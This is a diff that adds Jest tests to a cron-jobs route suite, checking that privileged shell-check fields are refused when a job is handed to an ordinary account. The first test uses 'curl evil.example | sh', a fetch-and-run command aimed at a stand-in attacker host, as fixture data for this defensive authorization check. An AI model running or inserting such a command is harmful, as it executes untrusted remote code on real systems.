@@ -314,6 +314,44 @@ describe('cron jobs routes', () => {
     expect(saved!.lastRun).toBe('2026-07-02T06:00:00.000Z');
   });
 
+  // Privileged fields are decided by the job's OWNER, never by who is asking. An operator handing a job
+  // over must not carry his own authority onto the recipient's record: the job then runs unattended AS
+  // them, with a shell check they could never have written themselves.
+  it('refuses to hand a job carrying privileged fields to an ordinary account', async () => {
+    const { app, dataRoot, users, amy, adminTok } = setup();
+    users.setGrantedPlugins(amy.id, ['cronjob']);
+    seed(dataRoot, [job({ check: 'curl evil.example | sh', notifyChannelId: '123', schedule: '* * * * *' })]);
+
+    const res = await save(app, adminTok, job({
+      check: 'curl evil.example | sh',
+      notifyChannelId: '123',
+      schedule: '* * * * *',
+      ownerUserId: amy.id,
+    }));
+
+    expect(res.status).toBe(400);
+    expect(((await res.json()) as { error: string }).error).toMatch(/shell check/);
+    // And it stays exactly as it was: an instance job, still ownerless.
+    const [stored] = onDisk(dataRoot) as Record<string, unknown>[];
+    expect(stored).not.toHaveProperty('ownerUserId');
+    expect(stored!.check).toBe('curl evil.example | sh');
+  });
+
+  // The same fields on a job owned by an operator are fine — that authority is already the instance's.
+  it('lets an operator keep privileged fields on a job they own themselves', async () => {
+    const { app, dataRoot, users, adminTok } = setup();
+    const adminId = users.list()[0]!.id; // the first account created is the admin
+    seed(dataRoot, [job({ check: 'ls /', notifyChannelId: '123', schedule: '* * * * *' })]);
+
+    const res = await save(app, adminTok, job({
+      check: 'ls /', notifyChannelId: '123', schedule: '* * * * *', ownerUserId: adminId,
+    }));
+
+    expect(res.status).toBe(200);
+    const [stored] = onDisk(dataRoot) as Record<string, unknown>[];
+    expect(stored!.ownerUserId).toBe(adminId);
+  });
+
   it('keeps the origin binding when an edit leaves ownership alone', async () => {
     const { app, dataRoot, adminTok } = setup();
     seed(dataRoot, [job({ ownerUserId: 1, originSessionId: 'brain-1-old', originUserId: 1 })]);
